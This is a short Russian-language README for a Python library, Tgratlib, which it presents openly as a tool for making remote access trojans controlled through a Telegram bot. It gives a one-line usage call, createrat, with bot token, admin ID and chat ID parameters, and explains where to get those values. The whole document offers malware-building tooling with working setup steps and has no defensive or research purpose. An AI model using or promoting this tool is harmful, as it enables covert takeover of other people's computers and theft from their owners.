# Tgratlib

Библиотека для Python для создания вирусов удалённого доступа(RAT) с управлением через Telegram.

Код для создания простого RAT:
```
import tgratlib

tgratlib.createrat(TOKEN="YOUR_BOT_TOKEN", ADMIN_ID=123456789, ADMIN_CHAT_ID=123456789)
```

В параметр TOKEN нужно поместить токен Telegram бота.
В параметр ADMIN_ID нужно поместить ваш ID в Telegram.
В параметр ADMIN_CHAT_ID нужно поместить ваш chat id.

Получить последние два параметра можно в @getmyid_bot.
